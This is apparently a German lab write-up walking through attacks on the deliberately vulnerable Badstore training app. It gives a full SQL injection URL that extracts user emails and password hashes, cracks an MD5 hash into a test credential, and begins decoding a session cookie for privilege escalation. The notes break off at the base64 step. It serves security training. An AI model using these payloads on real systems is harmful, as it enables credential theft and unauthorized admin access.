## 6.5. Broken Access Control
### Erst mittels SQL Injection an die User Daten kommen:
```SQL
http://192.168.178.119/cgi-bin/badstore.cgi?searchquery=xx%27+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,null,null+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
``` 

- User ist "AAA_Test_User", Passwort ist "098F6BCD4621D373CADE4E832627B4F6"

### Dann mittels https://hashes.com/en/decrypt/hash das Passwort rausfinden
- Die Daten sind *AAA_Test_user:test*

### Jetzt Cookie Tampering, um Privilege Escalation zu machen und Admin zu werden
- Cookie ist *SSOid=UFBX1Rlc3RfdXNlcjowOThmNmJjZDQ2MjFkMzczY2FkZTRlODMyNjI3YjRmNjpUZXN0IFVzZXI6%0AVQ%3D%3D%0A*
- Erst URL Decode: *UFBX1Rlc3RfdXNlcjowOThmNmJjZDQ2MjFkMzczY2FkZTRlODMyNjI3YjRmNjpUZXN0IFVzZXI6
VQ==*
- Vllt. base64 decode?